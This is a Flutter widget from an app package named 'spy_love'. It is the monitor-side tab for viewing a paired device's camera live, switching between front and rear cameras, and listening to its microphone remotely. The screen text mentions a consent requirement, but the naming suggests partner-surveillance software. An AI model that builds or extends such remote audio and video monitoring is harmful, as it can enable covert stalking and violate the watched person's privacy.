import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:spy_love/core/network/api_service.dart';
import 'package:spy_love/core/network/media_stream_client.dart';
import 'package:spy_love/core/storage/token_storage.dart';
import 'package:spy_love/features/monitoring/live_av/live_av_controller.dart';
import 'package:spy_love/features/monitoring/live_av/live_av_playback.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_repository.dart';

/// Monitor-side Live AV tab: camera preview, front/back switch, mic listen.
class LiveAvTab extends StatefulWidget {
  const LiveAvTab({super.key, required this.deviceId});

  final String deviceId;

  @override
  State<LiveAvTab> createState() => _LiveAvTabState();
}

class _LiveAvTabState extends State<LiveAvTab> {
  late final LiveAvController _controller;
  bool _wantCamera = true;
  bool _wantMic = true;

  @override
  void initState() {
    super.initState();
    final tokens = context.read<TokenStorage>();
    _controller = LiveAvController(
      LiveMediaRepository(context.read<ApiService>()),
      MediaStreamClient(tokens),
    );
    _controller.addListener(_onUpdate);
  }

  void _onUpdate() {
    final pcm = _controller.lastPcm;
    if (pcm != null && _controller.micEnabled) {
      LiveAvPlayback.playPcm(pcm, sampleRate: _controller.pcmSampleRate);
    }
  }

  @override
  void dispose() {
    _controller.removeListener(_onUpdate);
    _controller.dispose();
    LiveAvPlayback.stop();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ChangeNotifierProvider<LiveAvController>.value(
      value: _controller,
      child: Consumer<LiveAvController>(
        builder: (context, c, _) {
          return Column(
            children: [
              Expanded(child: _stage(c)),
              const Divider(height: 1),
              Padding(padding: const EdgeInsets.all(12), child: _controls(c)),
            ],
          );
        },
      ),
    );
  }

  Widget _stage(LiveAvController c) {
    if (c.frame != null && c.status == LiveAvStatus.live && c.cameraEnabled) {
      return Container(
        color: Colors.black,
        alignment: Alignment.center,
        child: Image.memory(
          c.frame!,
          gaplessPlayback: true,
          fit: BoxFit.contain,
        ),
      );
    }

    final (icon, message) = switch (c.status) {
      LiveAvStatus.idle => (
        Icons.videocam_outlined,
        'View the paired device camera and/or listen to its microphone.\n'
            'Requires camera / microphone consent on that device.',
      ),
      LiveAvStatus.requesting => (Icons.hourglass_empty, 'Starting…'),
      LiveAvStatus.waiting => (
        Icons.phonelink_ring_outlined,
        'Waiting for the paired device to connect…',
      ),
      LiveAvStatus.live => (
        Icons.hearing,
        c.micEnabled && !c.cameraEnabled
            ? 'Listening… ${c.audioChunks} chunks'
            : 'Live',
      ),
      LiveAvStatus.ended => (Icons.videocam_off_outlined, 'Session ended.'),
      LiveAvStatus.error => (
        Icons.error_outline,
        c.error ?? 'Could not start live AV.',
      ),
    };

    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, size: 48, color: Theme.of(context).colorScheme.primary),
            const SizedBox(height: 16),
            Text(message, textAlign: TextAlign.center),
            if (c.status == LiveAvStatus.live && c.micEnabled) ...[
              const SizedBox(height: 8),
              Text(
                'Mic chunks: ${c.audioChunks}',
                style: Theme.of(context).textTheme.bodySmall,
              ),
            ],
          ],
        ),
      ),
    );
  }

  Widget _controls(LiveAvController c) {
    final streaming = c.isStreaming;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        if (!streaming)
          Wrap(
            spacing: 8,
            runSpacing: 4,
            children: [
              FilterChip(
                label: const Text('Camera'),
                selected: _wantCamera,
                onSelected: (v) => setState(() => _wantCamera = v || _wantMic),
              ),
              FilterChip(
                label: const Text('Microphone'),
                selected: _wantMic,
                onSelected: (v) => setState(() => _wantMic = v || _wantCamera),
              ),
            ],
          ),
        const SizedBox(height: 8),
        Row(
          children: [
            if (streaming && c.cameraEnabled)
              Expanded(
                child: Text(
                  'Live • ${c.frameCount} frames'
                  '${c.micEnabled ? ' • ${c.audioChunks} audio' : ''}',
                  style: Theme.of(context).textTheme.bodySmall,
                ),
              )
            else
              const Spacer(),
            if (streaming && c.cameraEnabled) ...[
              IconButton(
                tooltip: 'Switch camera',
                onPressed: c.switchFacing,
                icon: Icon(
                  c.facing == 'front' ? Icons.camera_front : Icons.camera_rear,
                ),
              ),
            ],
            if (streaming)
              FilledButton.tonalIcon(
                onPressed: () async {
                  await c.stop();
                  await LiveAvPlayback.stop();
                },
                icon: const Icon(Icons.stop),
                label: const Text('Stop'),
              )
            else
              FilledButton.icon(
                onPressed: (!_wantCamera && !_wantMic)
                    ? null
                    : () => c.start(
                        widget.deviceId,
                        camera: _wantCamera,
                        mic: _wantMic,
                        facing: 'back',
                      ),
                icon: const Icon(Icons.videocam),
                label: const Text('Start live AV'),
              ),
          ],
        ),
      ],
    );
  }
}
